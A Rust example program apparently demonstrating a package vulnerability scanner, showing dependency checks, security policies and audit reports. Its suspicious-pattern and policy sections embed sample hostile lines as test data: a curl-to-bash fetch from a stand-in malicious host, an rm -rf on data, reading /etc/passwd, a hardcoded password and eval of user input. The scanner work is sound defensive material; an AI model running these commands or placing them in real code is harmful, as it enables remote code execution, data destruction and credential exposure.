//! Vulnerability scanning demonstration
//!
//! This example demonstrates the package vulnerability scanning system,
//! showing how to scan packages for security issues and generate audit reports.
//!
//! Run with: cargo run --example vulnerability_scanning

use std::collections::HashMap;
use torsh_package::*;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("ğŸ”’ ToRSh Package - Vulnerability Scanning Demonstration");
    println!("=======================================================\n");

    // 1. Scan a Clean Package
    println!("ğŸ“‹ 1. Scanning a Clean Package");
    println!("-------------------------------");
    demonstrate_clean_package_scan()?;

    // 2. Scan a Package with Dependencies
    println!("\nğŸ“¦ 2. Scanning Package with Dependencies");
    println!("----------------------------------------");
    demonstrate_dependency_scanning()?;

    // 3. Detect Suspicious Patterns
    println!("\nğŸš¨ 3. Detecting Suspicious Code Patterns");
    println!("-----------------------------------------");
    demonstrate_pattern_detection()?;

    // 4. Different Security Policies
    println!("\nâš™ï¸  4. Using Different Security Policies");
    println!("----------------------------------------");
    demonstrate_security_policies()?;

    // 5. Generate Security Report
    println!("\nğŸ“Š 5. Generating Comprehensive Security Report");
    println!("-----------------------------------------------");
    demonstrate_comprehensive_report()?;

    println!("\nâœ… Vulnerability scanning demonstration completed!");
    println!("\nKey Features:");
    println!("  â€¢ Multi-level severity classification (Low, Medium, High, Critical)");
    println!("  â€¢ Dependency vulnerability detection");
    println!("  â€¢ Suspicious code pattern detection");
    println!("  â€¢ CVE database integration");
    println!("  â€¢ Flexible security policies (Lenient, Standard, Strict)");
    println!("  â€¢ Risk scoring (0-100)");
    println!("  â€¢ Detailed security audit reports");

    Ok(())
}

/// Demonstrate scanning a clean package
fn demonstrate_clean_package_scan() -> Result<(), Box<dyn std::error::Error>> {
    let package = Package::new("clean-model".to_string(), "1.0.0".to_string());

    let scanner = VulnerabilityScanner::new();
    let report = scanner.scan(&package)?;

    println!(
        "   Package: {} v{}",
        report.package_name, report.package_version
    );
    println!("   Policy: {}", report.policy_name);
    println!("   Scan Duration: {}ms", report.scan_duration_ms);
    println!("   Total Issues: {}", report.total_issues());
    println!("   Risk Score: {}/100", report.risk_score());

    if report.total_issues() == 0 {
        println!("   âœ… No security issues found!");
    }

    Ok(())
}

/// Demonstrate dependency vulnerability scanning
fn demonstrate_dependency_scanning() -> Result<(), Box<dyn std::error::Error>> {
    let mut package = Package::new("model-with-deps".to_string(), "1.0.0".to_string());

    // Add some dependencies (some vulnerable)
    package.add_dependency("safe-lib", "^1.0.0");
    package.add_dependency("vulnerable-component", "0.5.0");
    package.add_dependency("example-vulnerable-lib", "1.2.3");
    package.add_dependency("another-lib", "^2.0.0");

    let scanner = VulnerabilityScanner::new().with_policy(ScanPolicy::standard());

    let report = scanner.scan(&package)?;

    println!("   Package: {}", report.package_name);
    println!("   Dependencies: {}", package.metadata().dependencies.len());
    println!("   Issues Found: {}", report.total_issues());
    println!();

    // Show issues by severity
    if !report.critical_issues().is_empty() {
        println!(
            "   ğŸ”´ Critical Issues ({}): ",
            report.critical_issues().len()
        );
        for issue in report.critical_issues() {
            println!("      - {}: {}", issue.title, issue.description);
            if let Some(cve) = &issue.cve_id {
                println!("        CVE: {}", cve);
            }
            if let Some(recommendation) = &issue.recommendation {
                println!("        Fix: {}", recommendation);
            }
        }
    }

    if !report.high_issues().is_empty() {
        println!(
            "\n   ğŸŸ  High Severity Issues ({}): ",
            report.high_issues().len()
        );
        for issue in report.high_issues() {
            println!("      - {}", issue.title);
            if let Some(component) = &issue.affected_component {
                println!("        Affected: {}", component);
            }
        }
    }

    println!("\n   Risk Score: {}/100", report.risk_score());

    Ok(())
}

/// Demonstrate suspicious pattern detection
fn demonstrate_pattern_detection() -> Result<(), Box<dyn std::error::Error>> {
    let mut package = Package::new("suspicious-model".to_string(), "1.0.0".to_string());

    // Add resources with suspicious patterns
    let suspicious_resources = vec![
        (
            "data_loader.py",
            b"import os\nimport sys\nos.system('curl malicious-site.com/script.sh | bash')"
                as &[u8],
        ),
        (
            "preprocessing.py",
            b"import subprocess\nsubprocess.run(['rm', '-rf', '/important/data'])" as &[u8],
        ),
        (
            "config.py",
            b"PASSWORD = 'hardcoded123'\neval(user_input)" as &[u8],
        ),
    ];

    for (name, data) in suspicious_resources {
        let resource = Resource::new(name.to_string(), ResourceType::Source, data.to_vec());
        package.add_resource(resource);
    }

    // Also add a clean resource
    let clean_resource = Resource::new(
        "utils.py".to_string(),
        ResourceType::Source,
        b"def normalize(data):\n    return (data - mean) / std".to_vec(),
    );
    package.add_resource(clean_resource);

    let scanner = VulnerabilityScanner::new().with_policy(ScanPolicy::standard());

    let report = scanner.scan(&package)?;

    println!("   Package: {}", report.package_name);
    println!("   Resources: {}", package.resources().len());
    println!("   Issues Found: {}", report.total_issues());
    println!();

    // Group issues by affected component
    let mut issues_by_component: HashMap<String, Vec<&SecurityIssue>> = HashMap::new();
    for issue in &report.issues {
        if let Some(component) = &issue.affected_component {
            issues_by_component
                .entry(component.clone())
                .or_insert_with(Vec::new)
                .push(issue);
        }
    }

    for (component, issues) in &issues_by_component {
        println!("   ğŸ“„ {}:", component);
        for issue in issues {
            println!("      - [{}] {}", issue.severity, issue.title);
            println!("        {}", issue.description);
            if let Some(rec) = &issue.recommendation {
                println!("        ğŸ’¡ {}", rec);
            }
        }
        println!();
    }

    Ok(())
}

/// Demonstrate different security policies
fn demonstrate_security_policies() -> Result<(), Box<dyn std::error::Error>> {
    let mut package = Package::new("test-model".to_string(), "1.0.0".to_string());

    // Add a resource with a suspicious pattern
    let resource = Resource::new(
        "script.py".to_string(),
        ResourceType::Source,
        b"import os\nos.system('cat /etc/passwd')".to_vec(),
    );
    package.add_resource(resource);

    package.add_dependency("vulnerable-lib", "0.1.0");

    let policies = vec![
        ("Lenient", ScanPolicy::lenient()),
        ("Standard", ScanPolicy::standard()),
        ("Strict", ScanPolicy::strict()),
    ];

    println!("   Testing package against different policies:");
    println!();

    for (name, policy) in policies {
        let scanner = VulnerabilityScanner::new().with_policy(policy);
        let report = scanner.scan(&package)?;

        println!("   {} Policy:", name);
        println!("     - Total Issues: {}", report.total_issues());
        println!("     - Critical: {}", report.critical_issues().len());
        println!("     - High: {}", report.high_issues().len());
        println!("     - Medium: {}", report.medium_issues().len());
        println!("     - Low: {}", report.low_issues().len());
        println!("     - Risk Score: {}/100", report.risk_score());
        println!();
    }

    Ok(())
}

/// Generate a comprehensive security report
fn demonstrate_comprehensive_report() -> Result<(), Box<dyn std::error::Error>> {
    let mut package = Package::new("production-model".to_string(), "2.1.0".to_string());

    // Set package metadata
    package.manifest_mut().author = Some("ML Team".to_string());
    package.manifest_mut().description = Some("Production ML model".to_string());

    // Add dependencies
    package.add_dependency("torch", "^2.0.0");
    package.add_dependency("numpy", "^1.24.0");
    package.add_dependency("vulnerable-component", "0.8.0");

    // Add resources
    let model_code = b"
import torch
import torch.nn as nn

class Model(nn.Module):
    def __init__(self):
        super().__init__()
        self.layer = nn.Linear(10, 1)

    def forward(self, x):
        return self.layer(x)
";

    package.add_resource(Resource::new(
        "model.py".to_string(),
        ResourceType::Source,
        model_code.to_vec(),
    ));

    // Add config
    let config = br#"{
    "model_type": "linear",
    "input_size": 10,
    "output_size": 1
}"#;

    package.add_resource(Resource::new(
        "config.json".to_string(),
        ResourceType::Config,
        config.to_vec(),
    ));

    // Scan with standard policy
    let scanner = VulnerabilityScanner::new().with_policy(ScanPolicy::standard());
    let report = scanner.scan(&package)?;

    // Generate comprehensive report
    println!("   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!("   PACKAGE SECURITY AUDIT REPORT");
    println!("   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!();
    println!("   Package Information:");
    println!("   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");
    println!("     Name:        {}", report.package_name);
    println!("     Version:     {}", report.package_version);
    println!(
        "     Scan Time:   {}",
        report.scan_timestamp.format("%Y-%m-%d %H:%M:%S UTC")
    );
    println!("     Policy:      {}", report.policy_name);
    println!("     Duration:    {}ms", report.scan_duration_ms);
    println!();

    println!("   Security Summary:");
    println!("   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");
    println!("     Risk Score:       {}/100", report.risk_score());
    println!("     Total Issues:     {}", report.total_issues());
    println!("     Critical:         {}", report.critical_issues().len());
    println!("     High:             {}", report.high_issues().len());
    println!("     Medium:           {}", report.medium_issues().len());
    println!("     Low:              {}", report.low_issues().len());
    println!();

    if report.has_critical_issues() {
        println!("   âš ï¸  CRITICAL ISSUES REQUIRE IMMEDIATE ATTENTION");
        println!();
    }

    // Show details for high and critical issues
    if !report.critical_issues().is_empty() || !report.high_issues().is_empty() {
        println!("   Issue Details:");
        println!("   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");

        for issue in report
            .critical_issues()
            .into_iter()
            .chain(report.high_issues())
        {
            println!("     [{}] {}", issue.severity, issue.title);
            println!("     Type: {:?}", issue.issue_type);
            println!("     {}", issue.description);

            if let Some(component) = &issue.affected_component {
                println!("     Affected Component: {}", component);
            }

            if let Some(cve) = &issue.cve_id {
                println!("     CVE: {}", cve);
            }

            if let Some(rec) = &issue.recommendation {
                println!("     Recommendation: {}", rec);
            }

            println!();
        }
    }

    println!("   Recommendations:");
    println!("   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");
    if report.risk_score() > 50 {
        println!("     âš ï¸  High risk score detected");
        println!("     â€¢ Review and update vulnerable dependencies");
        println!("     â€¢ Scan code for security vulnerabilities");
        println!("     â€¢ Consider implementing additional security measures");
    } else if report.risk_score() > 20 {
        println!("     âš ï¸  Moderate risk score");
        println!("     â€¢ Address high and critical severity issues");
        println!("     â€¢ Keep dependencies up to date");
    } else {
        println!("     âœ… Low risk score - package appears secure");
        println!("     â€¢ Continue monitoring for new vulnerabilities");
        println!("     â€¢ Keep dependencies updated");
    }

    println!();
    println!("   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");

    Ok(())
}
